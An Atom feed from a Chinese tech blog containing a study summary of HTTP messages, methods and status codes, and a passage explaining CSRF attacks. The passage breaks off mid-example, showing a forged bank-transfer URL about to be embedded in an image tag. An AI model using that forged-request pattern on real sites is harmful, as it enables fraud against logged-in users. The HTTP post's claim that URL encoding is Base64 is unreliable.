<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小晓晓晓林</title>
  
  <subtitle>夜深忽梦少年事❤️唯梦闲人不梦君</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xiaoxiaoxiaoxiaolin.github.io/"/>
  <updated>2019-08-24T10:21:39.419Z</updated>
  <id>https://xiaoxiaoxiaoxiaolin.github.io/</id>
  
  <author>
    <name>L</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTTP协议知识点总结</title>
    <link href="https://xiaoxiaoxiaoxiaolin.github.io/posts/7f4f0569.html/"/>
    <id>https://xiaoxiaoxiaoxiaolin.github.io/posts/7f4f0569.html/</id>
    <published>2019-08-24T03:30:45.000Z</published>
    <updated>2019-08-24T10:21:39.419Z</updated>
    
    <content type="html"><![CDATA[<p>　　最近看到一道与HTTP协议相关题目，感觉对计算机网络协议的知识点有点忘了，赶紧查阅资料对之前学习过的计算机网络知识做一个复习与总结。</p><a id="more"></a><h3 id="HTTP的概念"><a href="#HTTP的概念" class="headerlink" title="HTTP的概念"></a>HTTP的概念</h3><p>　　协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则。</p><p>　　HTTP协议，又称超文本传输协议（Hypertext transfer protocol），是一种详细规定了浏览器和万维网（WWW，World Wide Web）服务器之间互相通信的通信协议，它允许将超文本标记语言（HTML）文档从Web服务器传送到客户端的浏览器，可以使浏览器更加高效，减少网络的传输。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。</p><p>　　HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型，也是一个无状态的协议。HTTP默认的端口号为80，HTTPS的端口号为443。</p><p>　　在Internet中所有的传输都是通过TCP/IP进行的。HTTP协议作为TCP/IP模型中应用层的协议也不例外。HTTP协议通常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。如下图所示：</p><p><img src="/posts/7f4f0569.html/1.png" alt></p><h3 id="发展简史"><a href="#发展简史" class="headerlink" title="发展简史"></a>发展简史</h3><p>　　它的发展是万维网协会（World Wide Web Consortium）和Internet工作小组IETF（Internet Engineering Task Force）合作的结果，他们最终发布了一系列的RFC，RFC 1945定义了HTTP/1.0版本。其中最著名的就是RFC 2616。RFC 2616定义了今天普遍使用的一个版本——HTTP 1.1。</p><h3 id="HTTP的特点"><a href="#HTTP的特点" class="headerlink" title="HTTP的特点"></a><strong>HTTP的特点</strong></h3><p>　　HTTP协议永远都是客户端发起请求，服务器回送响应。这样就限制了使用HTTP协议，无法实现在客户端没有发起请求的时候，服务器将消息推送给客户端。</p><p><strong>HTTP协议的主要特点</strong></p><p>1、支持CS（客户/服务器）模式，还有基本认证和安全认证。</p><p>2、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</p><p>3、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</p><p>4、HTTP 0.9和1.0使用非持续连接：<code>限制每次连接只处理一个请求</code>，服务器处理完客户的请求，并收到客户的应答后，即断开连接。</p><p>5、HTTP 1.1使用持续连接：不必为每个web对象创建一个新的连接，<code>一个连接可以传送多个对象</code>，采用这种方式可以节省传输时间。</p><p>6、无状态：HTTP协议是无状态协议，无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p><p><strong>无状态协议</strong></p><p>　　协议的状态是指下一次传输可以“记住”这次传输信息的能力。</p><p>　　HTTP是不会为了下一次连接而维护这次连接所传输的信息,为了保证服务器内存。</p><p>　　比如客户获得一张网页之后关闭浏览器，然后再一次启动浏览器，再登陆该网站，但是服务器并不知道客户关闭了一次浏览器。</p><p>　　由于Web服务器要面对很多浏览器的并发访问，为了提高Web服务器对并发访问的处理能力，在设计HTTP协议时规定Web服务器发送HTTP应答报文和文档时，不保存发出请求的Web浏览器进程的任何状态信息。这有可能出现一个浏览器在短短几秒之内两次访问同一对象时，服务器进程不会因为已经给它发过应答报文而不接受第二次服务请求。由于Web服务器不保存发送请求的Web浏览器进程的任何信息，因此HTTP协议属于无状态协议（Stateless Protocol）。</p><p><strong>HTTP协议是无状态的和Connection: keep-alive的区别</strong></p><p>　　无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。从另一方面讲，打开一个服务器上的网页和你之前打开这个服务器上的网页之间没有任何联系。</p><p>　　HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议（无连接）。</p><p>　　从HTTP/1.1起，默认都开启了Keep-Alive，保持连接特性，简单地说，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接。</p><p>　　Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。</p><h3 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h3><p>　　 一个<strong>HTTP请求报文</strong>由<strong>请求行（request line）</strong>、<strong>请求头部（header）</strong>、<strong>空行</strong>和<strong>请求数据</strong>4个部分组成。</p><p><img src="/posts/7f4f0569.html/2.png" alt></p><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>　　<strong>请求行</strong>由<strong>请求方法字段</strong>、<strong>URL字段</strong>和<strong>HTTP协议版本字段</strong>3个字段组成。</p><p>　　<strong>请求行</strong>以<strong>一个方法符号开头</strong>，<strong>以空格分开</strong>，<strong>后面跟着请求的URI和协议的版本</strong>，格式如下：<code>Method Request-URI HTTP-Version CRLF</code>，例如，GET /index.html HTTP/1.1。</p><p>　　其中<code>Method表示请求方法</code>；<code>Request-URI是一个统一资源标识符</code>；<code>HTTP-Version表示请求的HTTP协议版本</code>；<code>CRLF表示回车和换行</code>（除了作为结尾的CRLF外，不允许出现单独的CR或LF字符）。</p><h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><p>　　<code>请求头部</code>由<code>关键字/值对</code>组成，<code>每行一对</code>，关键字和值用英文冒号<code>:</code>分隔。请求头部通知服务器有关于客户端请求的信息，常见的请求头有：</p><blockquote><p><code>User-Agent</code>：产生请求的浏览器类型；</p><p><code>Accept</code>：客户端可识别的响应内容类型列表；星号 <code>*</code>用于按范围将类型分组，用 <code>/</code> 指示可接受全部类型，用<code>type/*</code>指示可接受 type 类型的所有子类型</p><p><code>Accept-Language</code>：客户端可接受的自然语言；</p><p><code>Accept-Encoding</code>：客户端可接受的编码压缩格式；</p><p><code>Accept-Charset</code>：可接受的应答的字符集；</p><p><code>Host</code>：请求的主机名，允许多个域名同处一个IP 地址，即虚拟主机；</p><p><code>connection</code>：连接方式（close 或 keepalive）；</p><p><code>Cookie</code>：存储于客户端扩展字段，向同一域名的服务端发送属于该域的cookie；</p></blockquote><h4 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h4><p>　　最后一个请求头之后是一个空行，<code>发送回车符和换行符</code>，通知服务器以下不再有请求头。</p><h4 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h4><p>　　<code>请求数据不在GET方法中使用，而是在POST方法中使用</code>。POST方法适用于<code>需要客户填写表单的场合</code>。与请求数据相关的最常使用的请求头是<code>Content-Type和Content-Length</code>。</p><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><p>　　HTTP协议的请求方法有<code>GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT</code>。</p><p>而常见的有如下几种：</p><h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p>　　最常见的一种请求方式，当客户端要从服务器中读取文档时，当点击网页上的链接或者通过在浏览器的地址栏输入网址来浏览网页的，使用的都是GET方式。GET方法要求服务器将URL定位的资源放在响应报文的数据部分，回送给客户端。使用GET方法时，请求参数和对应的值附加在URL后面，利用一个问号<code>?</code>代表URL的结尾与请求参数的开始，传递参数长度受限制。例如，/index.jsp?id=100&amp;op=bind,这样通过GET方式传递的数据直接表示在地址中，所以我们可以把请求结果以链接的形式发送给好友。以用google搜索domety为例，Request格式如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /search?hl=zh-CN&amp;source=hp&amp;q=domety&amp;aq=f&amp;oq= HTTP/1.1  </span><br><span class="line"><span class="section">Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, </span></span><br><span class="line">application/msword, application/x-silverlight, application/x-shockwave-flash, */*  </span><br><span class="line"><span class="section">Referer: &lt;a href="http://www.google.cn/"&gt;http://www.google.cn/&lt;/a&gt;  </span></span><br><span class="line"><span class="section">Accept-Language: zh-cn  </span></span><br><span class="line"><span class="section">Accept-Encoding: gzip, deflate  </span></span><br><span class="line"><span class="section">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)  </span></span><br><span class="line"><span class="section">Host: &lt;a href="http://www.google.cn"&gt;www.google.cn&lt;/a&gt;  </span></span><br><span class="line"><span class="section">Connection: Keep-Alive  </span></span><br><span class="line"><span class="section">Cookie: PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g; </span></span><br><span class="line">NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-</span><br><span class="line">FxlRugatx63JLv7CWMD6UB_O_r</span><br></pre></td></tr></table></figure><p>　　可以看到，GET方式的请求一般不包含<code>请求内容</code>部分，<code>请求数据</code>以<code>地址的形式</code>表现在<code>请求行</code>。地址链接如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;a href="http://www.google.cn/search?hl=zh-CN<span class="variable">&amp;source</span>=hp<span class="variable">&amp;q</span>=domety<span class="variable">&amp;aq</span>=f<span class="variable">&amp;oq</span>="&gt;</span>http:<span class="comment">//www.google.cn/search?hl=zh-CN&amp;source=hp</span></span><br><span class="line"><span class="variable">&amp;q</span>=domety<span class="variable">&amp;aq</span>=f<span class="variable">&amp;oq</span>=<span class="params">&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>　　地址中<code>?</code>之后的部分就是通过GET发送的请求数据，我们可以在地址栏中清楚的看到，各个数据之间用<code>&amp;</code>符号隔开。显然，这种方式<code>不适合传送私密数据</code>。另外，由于不同的浏览器对地址的字符限制也有所不同，<code>一般最多只能识别1024个字符</code>，所以如果需要<code>传送大量数据的时候，也不适合使用GET方式</code>。</p><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><p>　　对于上面提到的不适合使用GET方式的情况，可以考虑使用POST方式，因为使用POST方法可以<code>允许客户端给服务器提供信息较多</code>。POST方法将<code>请求参数</code>封装在<code>HTTP请求数据</code>中，以<code>名称/值</code>的形式出现，可以<code>传输大量数据</code>，这样POST方式对<code>传送的数据大小没有限制</code>，而且<code>也不会显示在URL</code>中。还 以上面的搜索domety为例，如果使用POST方式的话，格式如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1  </span><br><span class="line"><span class="section">Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, </span></span><br><span class="line">application/msword, application/x-silverlight, application/x-shockwave-flash, */*  </span><br><span class="line"><span class="section">Referer: &lt;a href="http://www.google.cn/"&gt;http://www.google.cn/&lt;/a&gt;  </span></span><br><span class="line"><span class="section">Accept-Language: zh-cn  </span></span><br><span class="line"><span class="section">Accept-Encoding: gzip, deflate  </span></span><br><span class="line"><span class="section">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)  </span></span><br><span class="line"><span class="section">Host: &lt;a href="http://www.google.cn"&gt;www.google.cn&lt;/a&gt;  </span></span><br><span class="line"><span class="section">Connection: Keep-Alive  </span></span><br><span class="line"><span class="section">Cookie: PREF=ID=80a06da87be9ae3c:U=f7167333e2c3b714:NW=1:TM=1261551909:LM=1261551917:S=ybYcq2wpfefs4V9g; </span></span><br><span class="line">NID=31=ojj8d-IygaEtSxLgaJmqSjVhCspkviJrB6omjamNrSm8lZhKy_yMfO2M4QMRKcH1g0iQv9u-2hfBW7bUFwVh7pGaRUb0RnHcJU37y-</span><br><span class="line">FxlRugatx63JLv7CWMD6UB_O_r  </span><br><span class="line"></span><br><span class="line">hl=zh-CN&amp;source=hp&amp;q=domety</span><br></pre></td></tr></table></figure><p>　　可以看到，POST方式<code>请求行</code>中<code>不包含数据字符串</code>，这些数据保存在<code>请求内容</code>部分，各数据之间也是使用<code>&amp;</code>符号隔开。POST方式大多用于<code>页面的表单</code>中。因为POST也能完成GET的功能，因此多数人在设计表单的时候一律都使用POST方式，其实这是一个误区。GET方式也有自己的特点和优 势，我们应该根据不同的情况来选择是使用GET还是使用POST。</p><h4 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h4><p>　　HEAD就像GET，只不过服务端接受到HEAD请求后<code>只返回响应头</code>，而<code>不会发送响应内容</code>。这种方法是非常高效的，因为在传输的过程中省去了页面内容。可以在<code>不必传输整个响应内容</code>的情况下，就可以获取包含在<code>响应消息头中的元信息</code>。常用于测试超链接的有效性，是否可以访问，以及最近是否更新。</p><h4 id="其他几种请求方法"><a href="#其他几种请求方法" class="headerlink" title="其他几种请求方法"></a>其他几种请求方法</h4><p>OPTIONS</p><p>　　返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送<code>*</code>的请求来测试服务器的功能性。</p><p>PUT</p><p>　　向指定资源位置上传其最新内容。</p><p>DELETE</p><p>　　请求服务器删除Request-URI所标识的资源。</p><p>TRACE</p><p>　　回显服务器收到的请求，主要用于测试或诊断。</p><p>CONNECT</p><p>　　HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><p>　　HTTP服务器至少应该实现GET和HEAD方法，其他方法都是可选的。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。</p><h3 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h3><p>　　<strong>HTTP响应</strong>由<strong>状态行</strong>、<strong>响应头部</strong>、<strong>空行</strong>和<strong>响应正文</strong>4个部分组成。</p><p><img src="/posts/7f4f0569.html/3.png" alt></p><h4 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h4><p>　　<strong>状态行</strong>由<strong>HTTP协议版本字段</strong>、<strong>状态码</strong>和<strong>状态码的描述文本</strong>3个部分组成，他们之间使用空格隔开。</p><p>　　状态行格式：<code>HTTP-Version Status-Code Reason-Phrase CRLF</code></p><p>　　其中，<code>HTTP-Version表示服务器HTTP协议的版本</code>；<code>Status-Code表示服务器发回的响应状态代码</code>；<code>Reason-Phrase表示状态代码的文本描述</code>。</p><h4 id="响应头部"><a href="#响应头部" class="headerlink" title="响应头部"></a>响应头部</h4><p>　　响应报头允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对Request-URI所标识的资源进行下一步访问的信息。</p><p>　　常见的响应头部有：</p><p>　　<strong>Allow：</strong>服务器支持哪些请求方法（如GET、POST等）。</p><p>　　<strong>Location：</strong>Location 响应报头域用于重定向接受者到一个新的位置。例如：客户端所请求的页面已不存在原先的位置，为了让客户端重定向到这个页面新的位置，服务器端可以发回Location响应报头后使用重定向语句，让客户端去访问新的域名所对应的服务器上的资源;</p><p>　　<strong>Server：</strong>Server 响应报头域包含了服务器用来处理请求的软件信息及其版本。它和 User-Agent 请求报头域是相对应的，前者发送服务器端软件的信息，后者发送客户端软件（浏览器）和操作系统的信息。</p><p>　　更多详细的响应头信息可以点击👉<a href="https://www.runoob.com/http/http-header-fields.html" target="_blank" rel="noopener">传送门</a></p><h4 id="空行-1"><a href="#空行-1" class="headerlink" title="空行"></a>空行</h4><p>　　最后一个响应头部之后是一个空行，发送回车符和换行符，通知服务器以下不再有响应头部。</p><h4 id="响应正文"><a href="#响应正文" class="headerlink" title="响应正文"></a>响应正文</h4><p>　　服务器返回给客户端的文本信息。</p><h3 id="HTTP响应状态码"><a href="#HTTP响应状态码" class="headerlink" title="HTTP响应状态码"></a>HTTP响应状态码</h3><p>　　HTTP状态码（响应码）用来表明HTTP请求是否已经成功完成。</p><p>　　状态代码有三位数字组成，第一个数字定义了响应的类别，常用的状态码有五大类。</p><ul><li><strong>1xx</strong>：指示信息–表示请求已接收，继续处理</li><li><strong>2xx</strong>：成功–表示请求已被成功接收、理解、接受</li><li><strong>3xx</strong>：重定向–要完成请求必须进行更进一步的操作</li><li><strong>4xx</strong>：客户端错误–请求有语法错误或请求无法实现</li><li><strong>5xx</strong>：服务器端错误–服务器未能实现合法的请求</li></ul><p>　　具体的状态代码和状态描述的说明如下：</p><p><strong>1xx（信息类）</strong>：<strong>表示接收到请求并且继续处理</strong><br>100——客户必须继续发出请求<br>101——客户要求服务器根据请求转换HTTP协议版本</p><p><strong>2xx（响应成功）</strong>：<strong>表示动作被成功接收、理解和接受</strong><br>200——表明该请求被成功地完成，所请求的资源发送回客户端<br>201——提示知道新文件的URL<br>202——接受和处理、但处理未完成<br>203——返回信息不确定或不完整<br>204——请求收到，但返回信息为空<br>205——服务器完成了请求，用户代理必须复位当前已经浏览过的文件<br>206——服务器已经完成了部分用户的GET请求</p><p><strong>3xx（重定向类）</strong>：<strong>为了完成指定的动作，必须接受进一步处理</strong><br>300——请求的资源可在多处得到<br>301——本网页被永久性转移到另一个URL<br>302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出新的Request。<br>303——建议客户访问其他URL或访问方式<br>304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用<br>305——请求的资源必须从服务器指定的地址得到<br>306——前一版本HTTP中使用的代码，现行版本中不再使用<br>307——申明请求的资源临时性删除</p><p><strong>4xx（客户端错误类）</strong>：<strong>请求包含错误语法或不能正确执行</strong><br>400——客户端请求有语法错误，不能被服务器所理解<br>401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>HTTP 401.1 - 未授权：登录失败<br>HTTP 401.2 - 未授权：服务器配置问题导致登录失败<br>HTTP 401.3 - ACL 禁止访问资源<br>HTTP 401.4 - 未授权：授权被筛选器拒绝<br>HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败<br>402——保留有效ChargeTo头响应<br>403——禁止访问，服务器收到请求，但是拒绝提供服务<br>HTTP 403.1 禁止访问：禁止可执行访问<br>HTTP 403.2 - 禁止访问：禁止读访问<br>HTTP 403.3 - 禁止访问：禁止写访问<br>HTTP 403.4 - 禁止访问：要求 SSL<br>HTTP 403.5 - 禁止访问：要求 SSL 128<br>HTTP 403.6 - 禁止访问：IP 地址被拒绝<br>HTTP 403.7 - 禁止访问：要求客户证书<br>HTTP 403.8 - 禁止访问：禁止站点访问<br>HTTP 403.9 - 禁止访问：连接的用户过多<br>HTTP 403.10 - 禁止访问：配置无效<br>HTTP 403.11 - 禁止访问：密码更改<br>HTTP 403.12 - 禁止访问：映射器拒绝访问<br>HTTP 403.13 - 禁止访问：客户证书已被吊销<br>HTTP 403.15 - 禁止访问：客户访问许可过多<br>HTTP 403.16 - 禁止访问：客户证书不可信或者无效<br>HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效<br>404——可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。比如输入了错误的URL<br>405——用户在Request-Line字段定义的方法不允许<br>406——根据用户发送的Accept拖，请求资源不可访问<br>407——类似401，用户必须首先在代理服务器上得到授权<br>408——客户端没有在用户指定的饿时间内完成请求<br>409——对当前资源状态，请求不能完成<br>410——服务器上不再有此资源且无进一步的参考地址<br>411——服务器拒绝用户定义的Content-Length属性请求<br>412——一个或多个请求头字段在当前请求中错误<br>413——请求的资源大于服务器允许的大小<br>414——请求的资源URL长于服务器允许的长度<br>415——请求资源不支持请求项目格式<br>416——请求中包含的Range头字段无法被满足,通常是因为Range中的数字范围超出所请求资源的大小<br>417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。</p><p><strong>5xx（服务端错误类）</strong>：<strong>服务器不能正确执行一个正确的请求</strong><br>HTTP 500 - 服务器遇到错误，无法完成请求<br>HTTP 500.100 - 内部服务器错误 - ASP 错误<br>HTTP 500-11 服务器关闭<br>HTTP 500-12 应用程序重新启动<br>HTTP 500-13 - 服务器太忙<br>HTTP 500-14 - 应用程序无效<br>HTTP 500-15 - 不允许请求 global.asa<br>Error 501 - 未实现<br>HTTP 502 - 网关错误<br>HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常</p><p>　　更多详细的响应状态码信息可以点击👉<a href="https://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener">传送门</a></p><h3 id="HTTP请求GET和POST的区别"><a href="#HTTP请求GET和POST的区别" class="headerlink" title="HTTP请求GET和POST的区别"></a>HTTP请求GET和POST的区别</h3><p>1、数据提交的方式</p><p>　　GET提交：请求的数据会附在URL之后（就是把数据放置在HTTP协议头＜request-line＞中）， 以<code>?</code>分割<code>URL</code>和<code>传输数据</code>，多个参数用<code>&amp;</code>连接；例如：login.action?name=hyddd&amp; password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是<code>英文字母/数字</code>，原样发送，如果是<code>空格</code>，转换为<code>+</code>，如果是<code>中文/其他字符</code>，则直接把字符串用<code>BASE64加密</code>，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以<code>16进制表示的ASCII</code>。</p><p>　　POST提交：把提交的数据放置在是HTTP包的包体＜request-body＞中。</p><p>　　<strong>因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变</strong></p><p>2、传输数据的大小：</p><p>　　首先声明，HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。 而在实际开发中存在的限制主要有：</p><p>　　GET：特定浏览器和服务器对URL长度有限制，例如IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系统的支持。</p><p>　　<strong>因此，对于GET提交时，传输数据就会受到URL长度的限制。</strong></p><p>　　POST：由于不是通过URL传值，理论上数据不受限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。</p><p>3、安全性：</p><p>　　POST的安全性要比GET的安全性高。</p><p>　　注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。上面“安全”的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存， (2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/rainydayfmb/p/5319318.html" target="_blank" rel="noopener">HTTP请求报文和HTTP响应报文</a></li><li><a href="https://blog.csdn.net/gueter/article/details/1524447" target="_blank" rel="noopener">HTTP协议详解</a></li><li><a href="https://www.runoob.com/http/http-methods.html" target="_blank" rel="noopener">HTTP 请求方法 | 菜鸟教程</a></li><li><a href="https://www.cnblogs.com/CodingUniversal/p/7524088.html" target="_blank" rel="noopener">http请求报文格式和响应报文格式</a></li><li><a href="https://www.cnblogs.com/EricaMIN1987_IT/p/3837436.html" target="_blank" rel="noopener">HTTP协议详解</a></li><li><a href="https://blog.csdn.net/HY845638534/article/details/91448199" target="_blank" rel="noopener">HTTP五大类响应类型含义</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　最近看到一道与HTTP协议相关题目，感觉对计算机网络协议的知识点有点忘了，赶紧查阅资料对之前学习过的计算机网络知识做一个复习与总结。&lt;/p&gt;
    
    </summary>
    
      <category term="计算机网络" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="http" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>CSRF的攻击与防御原理</title>
    <link href="https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/"/>
    <id>https://xiaoxiaoxiaoxiaolin.github.io/posts/21bbd6b8.html/</id>
    <published>2019-08-22T01:27:05.000Z</published>
    <updated>2019-08-22T12:29:58.389Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">长风破浪会有时，直挂云帆济沧海</blockquote><p>　　CSRF（Cross Site Request Forgery）跨站域请求伪造，是一种网络的攻击方式，它在2007年曾被列为互联网20大安全隐患之一,也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，也就是人们所知道的钓鱼网站。</p><a id="more"></a><h3 id="CSRF介绍"><a href="#CSRF介绍" class="headerlink" title="CSRF介绍"></a>CSRF介绍</h3><p>　　CSRF攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作，有很大的危害性。</p><p>　　尽管听起来跟XSS跨站脚本攻击有点相似，但事实上CSRF与XSS差别很大，<strong>XSS</strong>利用的是<strong>站点内的信任用户</strong>，而<strong>CSRF</strong>则是<strong>通过伪装来自受信任用户的请求来利用受信任的网站</strong>。</p><p>　　与XSS攻击相比，CSRF攻击往往不大流行，因此对其进行防范的资源也相当稀少和难以防范，所以CSRF被认为比XSS更具危险性。</p><p><img src="/posts/21bbd6b8.html/CSRF%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B.jpeg" alt></p><p>　　上图为CSRF攻击的一个简单模型，用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。</p><h3 id="CSRF的攻击原理"><a href="#CSRF的攻击原理" class="headerlink" title="CSRF的攻击原理"></a>CSRF的攻击原理</h3><p><img src="/posts/21bbd6b8.html/CSRF%E7%9A%84%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.jpeg" alt></p><p>1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p><p>2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p><p>3、用户在未退出网站A的情况下（cookie有效的情况），在同一浏览器中，打开了另一个网站B；</p><p>4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问站点A，这个请求会带上浏览器端所保存的有效的站点A的cookie；</p><p>5.、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p><p>　　因此，站点A会报据用户C的权限来处理恶意站点B所发起的请求，而这个请求可能以用户C的身份发送邮件、短信、消息，以及进行转账支付等操作，这样恶意站点B就达到了伪造用户C请求站点 A的目的。</p><p>　　受害者只需要做下面两件事情，攻击者就能够完成CSRF攻击：</p><ul><li>登录受信任站点 A，并在本地生成cookie；</li><li>在不登出站点A（站点A的cookie有效）的情况下，访问恶意站点B。</li></ul><p>　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击。”是的，确实如此，但你不能保证以下情况不会发生：</p><p>1、你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p><p>2、你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了。</p><p>3、上图中所谓的攻击网站，很多情况下可能是一个存在其他漏洞（如XSS）的可信任且经常被人访问的网站。</p><h3 id="CSRF的攻击举例"><a href="#CSRF的攻击举例" class="headerlink" title="CSRF的攻击举例"></a>CSRF的攻击举例</h3><p>　　假设某银行网站A以GET请求来发起转账操作，转账的地址为<code>www.xxx.com/transfer.do？accountNum=l000l&amp;money=10000</code>，参数accountNum表示转账的账户，参数money表示转账金额。<br>而某大型论坛B上，一个恶意用户上传了一张图片，而图片的地址栏中填的并不是图片的地址，而是前而所说的砖账地址：<code>&lt;img 